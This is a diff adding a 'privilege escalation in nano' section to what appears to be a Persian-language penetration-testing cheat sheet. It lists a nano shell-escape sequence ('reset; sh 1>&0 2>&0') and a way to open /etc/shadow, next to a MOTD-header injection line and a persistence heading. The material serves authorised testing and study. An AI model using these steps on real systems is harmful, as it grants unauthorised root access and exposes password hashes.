@@ -323,6 +323,22 @@ sudo journalctl
 echo “id” >> 00-header
 ```
 
+### افزایش دسترسی در nano
+
+```text
+Ctrl+R + Ctrl+X
+reset; sh 1>&0 2>&0
+```
+
+یا
+
+```text
+Ctrl+W
+/etc/shadow
+```
+
+
+
 ## دسترسی همیشگی
 
 ### برای لینوکس \(در سیستم مهاجم\)
